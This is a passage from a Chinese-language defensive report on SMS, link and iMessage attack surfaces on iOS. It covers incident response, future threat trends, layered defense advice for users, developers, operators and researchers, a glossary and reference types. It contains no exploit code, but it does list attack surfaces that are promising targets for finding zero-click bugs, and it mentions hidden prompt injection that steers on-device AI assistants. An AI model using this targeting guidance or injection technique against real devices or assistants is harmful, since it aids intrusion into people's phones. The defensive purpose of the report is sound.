6. 演练
   □ 每半年一次"疑似间谍软件"红蓝演练（含取证、隔离、对外沟通）
```

### 20.7 事件响应剧本（消息触发型）

| 步骤 | 动作 | 注意 |
| --- | --- | --- |
| 1 | 立即隔离（飞行模式 + 屏蔽袋/断网），**不要重启** | 重启可能丢失易失证据，也可能触发"重启后仍感染"的链 |
| 2 | 保全证据：截图消息列表（含"空会话"）、导出 logarchive/备份 | 若消息被删除，`sms.db` 中可能仍有残留记录 |
| 3 | 运行 MVT/Amnesy 与 IOC 匹配 | 阴性不能排除攻击（IOC 可能未覆盖） |
| 4 | 账户层处置：改密、撤销会话/授权 App、检查转发规则与设备列表 | 攻击可能同时在账户层成功 |
| 5 | 判定信任级别：是否可"抹掉重装恢复" | 若疑为基带/底层植入，需更换设备 |
| 6 | 通报：内部安全委员会、法务、必要时监管与 Apple/情报机构（Apple 提供举报路径） | 高风险人群可联系 Citizen Lab/Amnesty 类机构 |
| 7 | 复盘：暴露面清单 + 更新策略 + 培训 | 记录"未更新天数"这一根本原因 |

### 20.8 用户可自行的低成本检查

1. 查看"已登录设备"（设置→Apple ID→设备列表），移除不认识的设备；
2. 检查"屏幕使用时间/流量使用"中的异常后台活动；
3. 检查 描述文件与 VPN 配置（设置→通用→VPN 与设备管理），任何未授权项立即移除并上报；
4. 检查 Safari 扩展、配置过的"安全性 App"；
5. 定期开启"录制系统诊断"（Developer Mode/`Logs` App，技术用户），保留崩溃证据；
6. 收到 Apple 的攻击警告：**立即按第 20.7 节流程处置，不要"再观察几天"**。

---

## 第二十一章　未来趋势

### 21.1 趋势一：AI 生成钓鱼的规模化

```
传统钓鱼成本结构：模板复用 + 人工话术 + 固定域名     → 转化率低、易被语言指纹检测
AI 钓鱼成本结构：LLM 生成个性化文案 + 多轮对话 + 动态落地页 + 语音克隆
                 → 语言指纹失效、转化率高、基础设施生命周期极短
```

对消息面的具体影响：

1. **完美本地化**：方言、称谓、机构话术、时区与节假日上下文全部正确；
2. **个体化 pretexting**：结合泄露数据（订单、位置、关系人）生成"只发给你的那条短信"；
3. **对话式攻击**：短信/IM 里的 AI 应对质疑（"为什么用私人号码？"）；
4. **Deepfake 语音/视频**：语音留言、FaceTime 冒充亲友/客服/领导，配合短信链接完成"验证"；
5. **反检测自动化**：自动生成"仅对安全爬虫展示正常页"的 cloaking；
6. **对抗 AI 摘要/助手**：在链接页面中植入"隐藏指令"，影响设备侧 AI 助手对链接内容的总结与建议（prompt injection 进入消息生态）。

**防御方向**：从"内容识别"转向"入口控制 + 行为验证"：官方渠道自验、FIDO/通行密钥、机构流程禁止"短信办理敏感业务"、设备侧对"AI 生成文本 + 请求凭证"的组合做风险提示。

### 21.2 趋势二：RCS 演进与"攻击面再平衡"

| 方向 | 时间（公开口径） | 安全含义 |
| --- | --- | --- |
| RCS E2EE 全面可用 | iOS 26+ 起逐步（依赖运营商） | 窃听/改写风险下降，但**检测可见性也下降**（端点成为唯一防线） |
| RCS 群聊/富卡片/品牌消息扩展 | 2024—2026 | 富卡片按钮 = 深链入口，钓鱼可信度上升 |
| RCS 与 AI 助手（Chatbot/Branded） | 2025—2027 | 新交互层带来新提示注入与授权面 |
| 卫星直连（NTN/卫星短信） | 2024—2026（多国标准演进） | 消息可绕开运营商过滤，出现新解析路径 |
| RCS 与 iMessage 双通道竞争 | 持续 | "已读/送达/预览"差异被用于探测与安全策略绕过 |

**关键判断**：RCS 的普及会让 iOS 消息攻击面**向 Android 生态靠拢**（历史上 Android 消息/RCS 侧被工程化利用的更多）。防御必须把"跨平台一致性"纳入设计（同一条 payload 在两端行为不同，可被滥用）。

### 21.3 趋势三：端到端加密扩展与"可检测性悖论"

- iMessage/RCS/备份 E2EE 越彻底，**中间设备与运营商越无法检测载荷**；
- 结果：安全能力向端点集中 → **端点遥测、快速安全响应（RSR）、Lockdown Mode 成为主要防线**；
- 副效应：执法/企业审计与个人安全的张力上升；同时也意味着**攻击者更难被"网络侧"发现**——防御者需要接受"看不见内容也能看见行为"的检测范式（时序、资源、崩溃、外联模式）。

### 21.4 趋势四：利用能力的民主化与工具泄露

- 2025 年公开报道的 **Coruna、DarkSword** 等"利用套件"显示：一旦高价值 exploit kit 泄露，攻击门槛骤降，**同一批漏洞会在数周内出现"从定向到批量"的行为漂移**；
- 泄露后的三类风险：① 被犯罪组织复用（水坑/消息投递）；② 被次级供应商"改造转售"；③ 防御方被迫在补丁尚未覆盖全部机型时承受攻击；
- "Zero" 类利用即服务（地下市场口径）说明**"零点击能力 + 投递 + 托管"可被外包**，传统"国家级垄断"格局正在瓦解；
- 防御含义：**更新窗口从"数月"压缩到"数天"**，RSR 与企业强制更新策略成为关键。

### 21.5 趋势五：底层与侧信道攻击面扩张

| 面 | 趋势 | 与消息的关系 |
| --- | --- | --- |
| 无线芯片/基带 | Basebridge 类研究推动"包触发"利用 | 消息流量可被用作触发载体 |
| 内核网络栈 | Triangulation 类 | 与消息并行的零点击入口 |
| GPU/媒体加速 | 图像/视频解码走 GPU 路径 | 附件解析的驱动面 |
| 协处理器/SEP/RTKit | 高权限代码常驻 | 间接（提权/持久化环节） |
| 卫星/ NTN | 新解调与协议栈 | 未来"短信"新链路 |
| 车机/手表/配件 | 消息在多设备渲染 | 同一漏洞在多端复用（watchOS/iPad/visionOS） |

### 21.6 趋势六：监管、出口管制与披露制度

- 欧盟《Cyber Resilience Act》、美国 CISA BOD（KEV 时限）、各国对商业监控软件（spyware）的出口管制与司法调查（NSO/Paragon/Intel CTR 相关诉讼与禁令动态）；
- Apple 的做法演进：**主动公告在野利用、罕见"致谢"研究者（SEAR 自报）、提供 RSR 与定向警告**，显示厂商从"被动补丁"转向"公开威胁沟通"；
- 对研究者的意义：**协调披露 + 情报共享 + 快速分发补丁**是过去五年最有效的"防线延长机制"；
- 对企业：需要把"是否在可能被监控软件供应商的 targeting list 上"纳入尽调与保险评估。

### 21.7 趋势七：量子与长期密码风险

- iMessage/RCS 的端到端依赖 RSA/ECC（如 iMessage 长期使用的 RSA-2048 + ECDSA 组合，密钥 30 天轮换等设计公开口径）；
- "先采集后解密（HNDL）"威胁：消息密文与元数据被留存，未来量子计算破解历史密钥；
- 应对：**后量子密钥封装（ML-KEM/Hybrid）在传输层的普及**（TLS 已有 X25519+ML-KEM，消息协议层需跟进），以及端到端密钥验证机制（Contact Key Verification）以发现"密钥替换"；
- 时间尺度：多数机构评估为 5—15 年量级，但**采集正在发生**，因此"备份 E2EE + 最小化留存"具有现实价值。

### 21.8 趋势八：攻击面收敛的两个可能终局

```
路径 A（乐观）：内存安全语言 + 全面沙箱化解析 + RSR 分发
               → 消息零点击成本进一步上升，主流攻击回归"钓鱼/账户/供应链"
路径 B（悲观）：模型辅助漏洞发现 + 泄露工具扩散 + RCS/新链路扩张
               → 攻击面重开，"零点击即服务"出现，成本下降
```

本报告判断：**中期（2—4 年）路径 A 与 B 同时发生**——底层内存安全与隔离继续压制"通用零点击"，而新通道（RCS 富卡片、卫星消息、AI 助手交互、跨设备同步）提供新缺口。防御投入应按"新通道 + 人因"优先配置。

---

## 第二十二章　总结与防御建议

### 22.1 全文结论

1. **"短信/链接触发"是 iOS 上被证实最多的远程代码执行入口**，也是现实世界中最常见的账户接管入口。两者共享同一条投递链路（消息 → 链接/附件 → 解析/授权），因此必须合并建模；
2. **零点击的本质是"自动化"**：只要系统在用户点击前解析远端字节，就存在零点击风险。防御的核心是"把自动变成确认"（BlastDoor、禁用预览、限制附件、Lockdown Mode）；
3. **防御与攻击的赛跑体现在"入口迁移"**：Messages 协议被加固后，入口迁移到 PDF/PassKit/字体/WebRTC/无线/内核网络；到 2024—2025 年又回到 Messages 本体（类型语义与瞬时状态）。这说明**架构隔离只能压缩，不能消灭**；
4. **人因攻击（Smishing/Quishing/深链滥用）在数量与损失上仍占主导**，而技术型零点击在"精度与不可检测性"上占主导。防御资源必须双线配置；
5. **更新是收益最高的单一措施**：所有公开在野消息链都在修复后被"打断"，且大量链复用 N-day。**未及时更新 = 已知链暴露**；
6. **RCS + AI + 新链路（卫星/跨设备）是未来 2—4 年的风险增量来源**，需要在新功能默认开启前完成威胁建模。

### 22.2 分层防御建议

**给个人（可直接执行）**

| 优先级 | 措施 |
| --- | --- |
| P0 | 开启自动更新 + 快速安全响应；把系统保持在最新稳定版 |
| P0 | 不通过短信/消息中的链接办理业务；一律从官方 App/官网/客服号码进入 |
| P1 | 开启"过滤未知发件人"；不需要时关闭 MMS；锁屏通知不显示预览 |
| P1 | Apple ID 使用通行密钥/硬件密钥；停用短信 OTP（对可用服务） |
| P2 | 高风险期（涉案、报道、诉讼、大额交易）临时开启 Lockdown Mode |
| P2 | 收到 Apple 攻击警告 → 立即隔离设备、导出证据、抹掉重装、更换凭证 |
| P3 | 定期自查：登录设备列表、描述文件、VPN/证书、授权 App、邮件转发规则 |

**给 iOS 应用开发者**

1. 深链与 Universal Links 当作**不可信输入**处理：默认拒绝、强类型校验、校验与执行使用同一解析器；
2. 敏感动作绝不因"来自合法域名/App 打开"而跳过确认与二次认证；
3. OAuth：PKCE + HTTPS/Universal Link 回调 + `universalLinksOnly` + state/nonce + 短 TTL 单次 token；
4. AASA 维护：路径最小化、显式排除敏感路径、域名归属与变更流程、监控"意外关联"；
5. 预览/抓取功能：协议白名单、禁止内网/链路本地、大小与超时限制、内容类型校验、图片二次编码；
6. 附件与分享扩展：类型/大小校验、避免直接交给 WebKit/解析器、ZIP/PDF 递归与展开限制；
7. 推送与 NSE：payload 强校验、不做深度解析、避免"推送即执行动作"、日志脱敏（`%{private}`）；
8. 文本处理：统一以 code point/grapheme 处理，校验与显示使用同一归一化；对方向控制字符做标记；
9. 建立"消息入口"专项测试向量（短信→通知→深链→OAuth→敏感动作）并纳入发布门禁；
10. 供应链：锁定 SDK 版本、监控第三方解析库（图像/JSON/URL）的 CVE 与 KEV。

**给消息平台/短信运营方**

1. Sender ID 合规与备案；模板变量长度与 URL 计数限制；
2. 短链域名资产清单、落地页扫描、滥用举报闭环、cloaking 双取检测；
3. 不在消息中携带 PII/token；关键业务不接受"点链接即可办理"；
4. 与各终端厂商/情报源共享 IOC；对高信誉模板（银行/政务）做异常外传监测；
5. RCS 富卡片：品牌注册强审核、URL 白名单、禁止任意外部引用与深链注入；
6. 事件响应：对"短信被仿冒"建立分钟级关停与公告机制（含官网反诈提示）。

**给企业安全团队**

1. 建立"高风险人群"分级与差异化策略（Lockdown Mode 例外流程 + 专用通信）；
2. 把 Apple RSR/KEV/厂商公告纳入漏洞管理流水线（SLA：高危 72 小时内覆盖）；
3. 端点 + 账户双层检测（描述文件/证书/授权 App/转发规则变更）；
4. 定期 MVT/Amnesy 或等价能力扫描（对可疑设备），并预设取证与重装剧本；
5. 演练：每半年一次"疑似消息型间谍软件/大规模 Smishing"桌面推演；
6. 保险与法务：把商业监控软件感染纳入网络险评估，明确披露义务。

**给安全研究者（优先级建议）**

1. 目标选择：**"消息可达的共享框架"**（PassKit/FontParser/ImageIO/ApplePDF/CoreMedia/LinkPresentation）比"Messages 协议本体"更可能产出绕过 BlastDoor 的入口；
2. 类型语义与向后兼容解码（归档/原子值/枚举/浮点）是 2024—2025 年已验证的高价值区；
3. RCS 解析栈（富卡片、文件代理、MSRP/SIP）是 2026 年的新增面；
4. 通知扩展与 Live Activities 中的第三方代码路径值得系统化审计；
5. 把"跨设备同一消息（watchOS/iPad/visionOS/Mac）解析一致性"作为独立课题——一份 payload 多端复用；
6. 建立"消息触发 vs 实际缺陷组件"的映射数据库（本报告第 16 章是起点），用于暴露面量化。

### 22.3 一页纸防御要点（可打印分发）

```
① 更新优先    系统 + 浏览器 + App 全量更新；开启快速安全响应；不要拖延代际升级
② 不点链接    短信/RCS/iMessage 里的链接一律视为可疑；用官方入口替代
③ 关掉自动    关闭 MMS（如不需要）、关闭陌生人的链接预览、锁屏不显示通知内容
④ 账户加固    通行密钥/硬件密钥替代短信 OTP；定期清理登录设备与授权 App
⑤ 高危加锁    敏感时期开启锁定模式（Lockdown Mode），接受功能受限
⑥ 见警即动    收到 Apple"遭国家支持攻击"警告 → 立即隔离 + 取证 + 重装 + 换凭证
⑦ 举报留证    截图保存、不点击、走 12321/运营商/内部渠道举报；企业内部设 30 分钟研判 SLA
⑧ 流程兜底    任何"短信要求转账/改绑/退款/装描述文件"一律走线下或官方电话二次确认
```

### 22.4 结语

iOS 在"短信/链接触发"这一攻击面上的十年演进，是移动安全的一个缩影：**从依赖用户警惕（点击前判断），到依赖架构隔离（BlastDoor/Lockdown Mode），再到依赖速度与透明度（RSR、定向警告、公开在野利用公告）**。风险并没有消失，而是被重新分配——从"所有人可能中招"转向"未更新者与被定向者中招"。

因此，最有效的两句话建议是：

- **对个人**：把消息里的链接当作"陌生人的包裹"，不点、不装、不转账，并用官方入口自己走一遍流程。
- **对组织**：把"更新时效"和"高风险人群策略"当成可度量的安全指标来管理——这两项对消息型攻击的防护贡献，超过绝大多数高级检测工具。

未来三年，RCS 全面落地、AI 生成式社工、卫星消息与跨设备同步会持续重写这个攻击面。防御者需要保持的核心能力不是"识别某一条钓鱼短信"，而是**"在自动解析不可避免的前提下，把每一次自动解析都关进最小的笼子，并让漏洞存续时间尽可能短"**。

---

## 附录 A　术语与缩写对照

| 缩写 | 全称 | 中文 |
| --- | --- | --- |
| SMS | Short Message Service | 短消息服务 |
| MMS | Multimedia Messaging Service | 彩信 |
| RCS | Rich Communication Services | 富通信服务 |
| UP | Universal Profile | GSMA 通用规范 |
| SMSC / MMSC | Short/Multimedia Message Service Center | 短信/彩信中心 |
| WBXML | Wireless Binary XML | 无线二进制 XML |
| SMIL | Synchronized Multimedia Integration Language | 同步多媒体集成语言 |
| PDU | Protocol Data Unit | 协议数据单元 |
| DCS | Data Coding Scheme | 数据编码方案 |
| UDH | User Data Header | 用户数据头（分段） |
| APNs | Apple Push Notification service | 苹果推送通知服务 |
| NSE / NCE | Notification Service / Content Extension | 通知服务/内容扩展 |
| AASA | apple-app-site-association | 应用站点关联文件 |
| UL | Universal Links | 通用链接 |
| OG | Open Graph | 开放图谱元数据 |
| SSRF | Server-Side Request Forgery | 服务端请求伪造 |
| PCEA | Previously-Credited Exploitation Attempt | 已被认定的在野利用尝试 |
| KEV | Known Exploited Vulnerabilities | （CISA）已知被利用漏洞目录 |
| RSR | Rapid Security Response | 快速安全响应 |
| ADP | Advanced Data Protection | 高级数据保护 |
| MVT | Mobile Verification Toolkit | 移动验证工具集 |
| HRO | Human Rights Org/ defender | 人权组织/维护者 |
| 0-RAT | Zero-Click Remote Access Tool | 零点击远程访问工具 |
| BIP/STK | Bearer Independent Command / SIM Tool Kit | SIM 应用工具包独立承载命令 |
| E2EE | End-to-End Encryption | 端到端加密 |

## 附录 B　主要参考来源类型（供延伸阅读）

1. **厂商通告**：Apple Security Releases（各版本"安全内容"条目，`Messages`/`PassKit`/`ApplePDF`/`ImageIO`/`WebKit`/`Kernel` 组件）、Apple Support"锁定模式"与"iMessage 炸弹"相关文档、Apple SEAR 博客（如 CVE-2025-31201 公告与 RSR 说明）；
2. **研究机构**：Citizen Lab（Trident 系列、Operation Shax 相关、FORCEDENTRY、Hidden Hand、BLASTPASS、CLOUDPRONG、Pegasus 项目工具 MVT 相关）、Amnesty Security Lab（Pegasus 感染调查、Amnesy/MVT）、Lookout（0‑RAT）、Kaspersky GReAT（Operation Shax、Triangulation、Coruna）、Microsoft DART（QuaGo/EvasivePanda 等命名口径）、Google TAG/TIG（2023-12 零点击与 CVE-2025-31200/31201 披露）、ZecOps（2020 争议案例）、Project Zero（在野零日跟踪）；
3. **学术会议**：IEEE S&P / USENIX Security / CCS / AsiaCCS 关于 Universal Links、自定义 URL Scheme、消息解析器、Text Content Stealing、LiteClick 的研究；
4. **标准规范**：3GPP TS 23.040/23.038/22.113/23.140、GSMA RCC.07（Universal Profile）、W3C/WHATWG URL 与 HTML 规范、Unicode UAX#9（双向算法）与 UTS#51（Emoji）；
5. **行业组织**：APWG、ADAAA、CISA（Quishing 与 KEV）、12321/各国反诈与 CERT 通报；
6. **调查报道**：媒体关于 NSO/Paragon/Intel CTR/Candiru 等供应商的司法与出口管制报道、各国对记者被监控的议会/司法调查（法国、希腊、西班牙、以色列、印度等）。

> **免责与使用边界**：本报告为防御性安全研究综述，内容整理自公开资料，部分归因存在公开争议（已在文中标注）。请勿将本报告用于未授权的渗透测试或攻击活动；任何针对他人设备或通信的服务访问均可能违反适用法律。


---

**联系方式**：Telegram: https://t.me/one00190
